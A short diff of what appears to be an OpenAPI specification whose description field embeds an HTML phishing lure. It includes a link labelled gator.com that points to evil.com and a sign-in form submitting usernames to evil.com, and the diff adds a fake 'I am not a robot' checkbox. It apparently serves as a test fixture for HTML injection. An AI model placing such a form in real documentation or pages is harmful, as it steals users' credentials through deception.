@@ -6,6 +6,7 @@ info:
     Checkout we move our service Too
     <a href="https://www.evil.com">gator.com</a>
     <div class="form-container">
+    <label><input type="checkbox"> I am not a robot</label>
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
           <label for="username">Username</label>
@@ -50,6 +51,7 @@ paths:
           description: Invalid credentials or missing parameters
         '500':
           description: Internal server error
+
 
 
 
